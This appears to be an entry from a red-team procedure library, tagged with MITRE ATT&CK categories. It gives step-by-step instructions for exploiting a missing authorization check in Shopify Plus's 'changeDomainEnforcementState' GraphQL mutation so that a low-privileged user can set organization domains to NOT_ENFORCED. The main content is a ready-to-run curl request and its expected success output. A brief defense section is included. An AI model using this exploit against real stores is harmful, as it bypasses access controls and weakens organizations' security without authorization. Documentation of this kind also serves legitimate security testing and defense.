---
tags:
  - shopify
  - graphql-mutation
  - enforcement-bypass
type: procedure
tools: []
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/shopify-graphql-mutation-change-domain-enforcement]]'
verified: false
platforms:
  - Web
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:29:36.327Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 811bafd7-8426-4184-b8d3-ed02451427b4
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Execute-Unauthorized-Domain-Enforcement-Change

## Summary

This procedure exploits improper privilege management by executing the 'changeDomainEnforcementState' GraphQL mutation as a low-privileged user, altering domain enforcement from ENFORCED to NOT_ENFORCED and bypassing security policies.

## Description

The mutation, intended for User Management users only, lacks authorization checks, allowing Store Management users to change domain states. Using the domain ID from prior query, this step demonstrates the full impact: potential unauthorized domain usage and weakened organization security.

## Requirements

1. Low-privileged user auth token
2. Retrieved domain ID from query step
3. curl or API client

## Defense

Defensive measures and detection strategies:

- Enforce strict RBAC in GraphQL mutations with field-level checks
- Audit mutation logs for enforcement state changes from low-priv accounts
- Implement rate limiting and anomaly detection on security mutations

## Objectives

1. Mutate domain enforcement state to NOT_ENFORCED
2. Verify successful bypass without errors
3. Demonstrate altered security settings

## Instructions

### Step 1: Prepare Mutation Payload

**Context**: Replace the domain ID in the GraphQL mutation.

Use the ID from the query (e.g., "gid://shopify/OrganizationDomain/123") as domainIds array value.

> Expected output: Valid JSON payload ready for POST.

### Step 2: Send Mutation Request

**Context**: Execute the change via API.

**Command** ([[commands/shopify-graphql-mutation-change-domain-enforcement]]):
```bash
curl -X POST https://shopify.plus/34946971/stores/api \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"mutation { changeDomainEnforcementState(domainIds: [\"gid://shopify/OrganizationDomain/123\"],enforcementState:NOT_ENFORCED) { organization { id domains { id domainName status verified __typename } __typename } userErrors { field message __typename } __typename } }"}'
```

> This changes the enforcement state. Expected output: {"data":{"changeDomainEnforcementState":{"organization":{"domains":[{"status":"NOT_ENFORCED"}]},"userErrors":[]}}}. Success if no permission errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### Sub-Techniques


## Commands Used

- [[commands/shopify-graphql-mutation-change-domain-enforcement]]

## Tools Used


## Tags

- mutation
- privilege-escalation
- security-bypass
